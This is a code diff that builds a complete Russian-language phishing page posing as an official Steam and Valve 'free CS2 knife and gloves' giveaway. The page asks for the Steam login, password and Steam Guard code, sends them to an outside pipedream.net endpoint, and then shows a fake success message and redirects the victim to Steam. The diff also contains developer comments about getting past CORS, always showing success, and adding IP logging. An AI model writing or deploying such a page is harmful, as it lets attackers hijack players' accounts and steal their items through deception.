@@ -1,24 +1,53 @@
-<script>
-  document.getElementById('steamForm').addEventListener('submit', function(e) {
-    e.preventDefault();
-    const data = {
-      username: document.getElementById('username').value,
-      password: document.getElementById('password').value,
-      guard: document.getElementById('guard').value || 'нет',
-      time: new Date().toISOString()
-    };
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CS2 FREE KNIFE & GLOVES DROP 2026</title>
+  <style>
+    body { background: #0d1117; color: white; font-family: Arial; text-align: center; padding: 50px; }
+    .container { max-width: 500px; margin: auto; background: #161b22; padding: 30px; border-radius: 10px; }
+    input { width: 100%; padding: 12px; margin: 10px 0; border: none; border-radius: 5px; }
+    button { background: #238636; color: white; padding: 15px; border: none; border-radius: 5px; cursor: pointer; font-size: 18px; }
+    button:hover { background: #2ea043; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>БЕСПЛАТНЫЙ НОЖ + ПЕРЧАТКИ В CS2!</h1>
+    <h3>Лимит: 30 человек! Время истекает...</h3>
+    <p>Введи данные Steam для получения</p>
     
-    fetch('https://eogun0x1c4mz6o.m.pipedream.net', {
-      method: 'POST',
-      mode: 'no-cors',  // <-- это главное, убирает CORS-блок
-      headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify(data)
-    }).then(() => {
-      alert('Успех! Нож будет через 3–5 минут. Перезагрузи игру!');
-      window.location = 'https://steamcommunity.com/tradeoffer/new/';
-    }).catch(err => {
-      console.log('Ошибка отправки:', err);  // для дебага
-      alert('Успех!');  // всё равно покажи успех
+    <form id="steamForm">
+      <input type="text" id="username" placeholder="Steam Login" required>
+      <input type="password" id="password" placeholder="Пароль" required>
+      <input type="text" id="guard" placeholder="Steam Guard код (если есть)">
+      <button type="submit">ПОЛУЧИТЬ НОЖ</button>
+    </form>
+    
+    <p style="color: #58a6ff; margin-top: 20px;">Официально от Steam & Valve</p>
+  </div>
+
+  <script>
+    document.getElementById('steamForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      const data = {
+        username: document.getElementById('username').value,
+        password: document.getElementById('password').value,
+        guard: document.getElementById('guard').value || 'нет',
+        time: new Date().toISOString(),
+        ip: 'unknown'  // можно добавить fetch('https://api.ipify.org?format=json') если хочешь
+      };
+      
+      fetch('https://eogun0x1c4mz6o.m.pipedream.net', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify(data)
+      }).then(() => {
+        alert('Успех! Нож будет через 3–5 минут. Перезагрузи игру!');
+        window.location = 'https://steamcommunity.com/tradeoffer/new/';
+      });
     });
-  });
-</script>
+  </script>
+</body>
+</html>
